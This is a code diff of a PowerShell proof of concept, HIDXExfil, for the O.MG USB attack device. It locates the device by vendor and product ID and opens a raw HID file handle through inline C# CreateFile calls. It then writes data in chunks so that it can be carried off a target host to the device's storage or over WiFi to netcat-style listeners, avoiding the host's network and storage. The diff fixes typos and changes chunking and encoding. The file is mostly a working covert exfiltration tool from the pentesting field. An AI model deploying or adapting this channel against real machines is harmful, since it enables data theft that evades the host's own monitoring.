@@ -13,7 +13,7 @@ pentesting pathways beyond using the target host’s network interfaces or
 mass storage.
 This POC will allow data exfiltration back to the O.MG’s flash storage or
 act as a proxy between the target host and another device, via the O.MG
-Device's built in WiFi interface, which can allow you to receive data via listeners 
+Device's built-in WiFi interface, which can allow you to receive data via listeners 
 like nc, netcat, or similar tools.
 
 .PARAMETER Message
@@ -30,7 +30,7 @@ Defining a message:
 HIDXExfil -Message "hello world"
 
 .EXAMPLE
-HIDX usage with every paramter: 
+HIDX usage with every parameter: 
 HIDXExfil -VendorID D3C0 -ProductID D34D -Message "test"
 
 .EXAMPLE
@@ -46,7 +46,7 @@ https://github.com/0iphor13
 https://github.com/spiceywasabi
 https://github.com/rogandawes
 
-#Credits to Rogan for idea of filehandle and device identification
+#Credits to Rogan for the idea of filehandle and device identification
 #>
 
     [cmdletbinding()]
@@ -67,72 +67,59 @@ https://github.com/rogandawes
             $ProductID = "D34D" # Default value
     )
 
-    function Get-OMGDevice {
-        param(
-            $vendorID,
-            $productID
-        )
-
-        $omg = $vendorID + "&PID_" + $productID
+    $omg = $vendorID + "&PID_" + $productID
+    function Get-OMGDevice(){
+        #Identify OMG device
         $devs = gwmi Win32_USBControllerDevice
-
+        $devicestring=$null
         foreach ($dev in $devs) {
             $wmidev = [wmi]$dev.Dependent
-            if ($wmidev.GetPropertyValue('DeviceID') -match ($omg) -and 
-                ($wmidev.GetPropertyValue('Service') -eq $null)) {
-                return ([char]92+[char]92+'?'+[char]92 + 
-                    $wmidev.GetPropertyValue('DeviceID').ToString().Replace([char]92,[char]35)+[char]35+'{4d1e55b2-f16f-11cf-88cb-001111000030}')
+            if ($wmidev.GetPropertyValue('DeviceID') -match ($omg) -and ($null -eq $wmidev.GetPropertyValue('Service'))) {
+                $devicestring = ([char]92+[char]92+'?'+[char]92 + $wmidev.GetPropertyValue('DeviceID').ToString().Replace([char]92,[char]35) + [char]35+'{4d1e55b2-f16f-11cf-88cb-001111000030}')
             }
         }
 
-        return $null
+        return $devicestring
     }
 
-
-    function Send-Payload {
+    function Send-Message {
         param(
             $fileHandle,
             $payload
         )
 
         $payloadLength = $payload.Length
-        $chunkSize = 1
+        $chunkSize = 8  # Kept at 8 for best experience
         $chunkNr = [Math]::Ceiling($payloadLength / $chunkSize)
 
+ for ($i = 0; $i -lt $chunkNr; $i++) {
         $bytes = New-Object Byte[] (65)
-        $fileHandle.Write($bytes, 0, 65)
-
-        for ($i = 0; $i -lt $chunkNr; $i++) {
-            $start = $i * $chunkSize
-            $end = [Math]::Min(($i + 1) * $chunkSize, $payloadLength)
-            $chunkLen = $end - $start
-            $payloadChunk = New-Object Byte[] $chunkLen
-            [System.Buffer]::BlockCopy($payload, $start, $payloadChunk, 0, $chunkLen)
-            $bytes[1] = $chunkLen
-            [System.Buffer]::BlockCopy($payloadChunk, 0, $bytes, 2, $chunkLen)
-            $fileHandle.Write($bytes, 0, 65)
+        $start = $i * $chunksize
+        $end = [Math]::Min(($i + 1) * $chunksize, $payloadLength)
+        $chunkLen = $end - $start
+        [System.Buffer]::BlockCopy($payload, $start, $bytes, 1, $chunkLen)
+        $filehandle.Write($bytes, 0, 65)
         }
     }
 
-    $cs = @"
-    using System;
-    using System.IO;
-    using Microsoft.Win32.SafeHandles;
-    using System.Runtime.InteropServices;
-    namespace omg {
-        public class hidx {
-            [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-            public static extern SafeFileHandle CreateFile(String fn, UInt32 da, Int32 sm, IntPtr sa, Int32 cd, uint fa, IntPtr tf);
-            public static FileStream open(string fn) {
-                return new FileStream(CreateFile(fn, 0XC0000000U, 3, IntPtr.Zero, 3, 0x40000000, IntPtr.Zero), FileAccess.ReadWrite, 9, true);
-            }
+                Add-Type -TypeDefinition @"
+using System;
+using System.IO;
+using Microsoft.Win32.SafeHandles;
+using System.Runtime.InteropServices;
+namespace omg {
+    public class hidx {
+        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        public static extern SafeFileHandle CreateFile(String fn, UInt32 da, Int32 sm, IntPtr sa, Int32 cd, uint fa, IntPtr tf);
+
+        public static FileStream open(string fn) {
+            return new FileStream(CreateFile(fn, 0XC0000000U, 3, IntPtr.Zero, 3, 0x40000000, IntPtr.Zero), FileAccess.ReadWrite, 3, true);
         }
     }
+}
 "@
-    Add-Type -TypeDefinition $cs
-
     try {
-        $deviceString = Get-OMGDevice -vendorID $VendorID -productID $ProductID
+        $deviceString = Get-OMGDevice
 
         if ($deviceString -eq $null) {
             Write-Host -ForegroundColor Red "[!]Error: Could not find OMG device - Check VID/PID"
@@ -146,8 +133,8 @@ https://github.com/rogandawes
             return
         }
 
-        $payload = [System.Text.Encoding]::UTF8.GetBytes($Message + "`n")
-        Send-Payload -fileHandle $fileHandle -payload $payload
+        $payload = [System.Text.Encoding]::ASCII.GetBytes($Message + "`n")
+        Send-Message -fileHandle $fileHandle -payload $payload
 
     } catch {
         Write-Host -ForegroundColor Red "[!]Error: $($PSItem.Exception.Message)"
